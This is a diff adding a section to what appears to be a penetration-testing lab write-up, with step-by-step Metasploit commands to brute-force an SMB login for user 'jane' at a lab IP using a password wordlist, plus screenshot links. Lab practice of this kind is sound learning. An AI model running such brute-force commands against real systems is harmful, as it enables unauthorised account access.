@@ -63,6 +63,38 @@ Command: nmap 192.86.121.3
 <br />
 <br />
 <br />
+Use the msfconsole tool (metasploit) run a login bruteforce attack on the SMB server: <br/>
+<br/>
+- We . 
+<br/>
+<br/>
+Commands: msfconsole
+<br/>
+use auxiliary/scanner/smb/smb_login
+<br/>
+options
+<br/>
+set rhosts 192.86.121.3
+<br/>
+set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+<br/>
+set smbuser jane
+<br/>
+exploit
+<br/>
+<br/>
+<img src="https://i.imgur.com/dOAXa38.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<img src="https://i.imgur.com/MSLfZtm.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<img src="https://i.imgur.com/Oj2hjIe.png" height="80%" width="80%" alt="SMB Nmap Scripting" class="center"/>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
 
 
 
